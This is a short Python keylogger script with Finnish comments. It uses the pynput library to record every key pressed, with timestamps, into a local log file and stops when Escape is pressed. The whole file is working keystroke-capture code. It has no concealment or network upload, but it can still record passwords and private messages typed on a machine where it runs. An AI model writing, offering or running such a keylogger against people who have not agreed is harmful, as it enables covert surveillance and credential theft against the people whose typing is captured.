# Tuodaan tarvittavat kirjastot
from pynput.keyboard import Key, Listener  # pynput.keyboard käsittelee näppäimistön tapahtumia
import logging  # logging kirjaa tapahtumat tiedostoon

# Määritä lokitiedoston tallennuspolku ja nimi
log_directory = ".\\keylog"  # Korvaa tämä polku haluamallasi polulla
log_file = "key_log.txt"  # Lokitiedoston nimi

# Asetetaan lokituksen konfiguraatio: tiedostonimi, lokitason ja viestin muoto
logging.basicConfig(filename=f"{log_directory}/{log_file}", level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Funktio suoritetaan, kun näppäintä painetaan
def on_press(key):
    try:
        # Yritetään kirjata normaalin näppäimen merkki
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Jos näppäimellä ei ole merkkiä (esim. välilyönti, enter), kirjataan se erikoisnäppäimenä
        logging.info(f"Special key pressed: {key}")

# Funktio suoritetaan, kun näppäin vapautetaan
def on_release(key):
    if key == Key.esc:
        # Jos escape-näppäintä painetaan, lopetetaan kuuntelija
        return False

# Pääsuoritus: asetetaan kuuntelija seuraamaan näppäimen painalluksia ja vapautuksia
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  # Aloittaa näppäimistötapahtumien kuuntelun
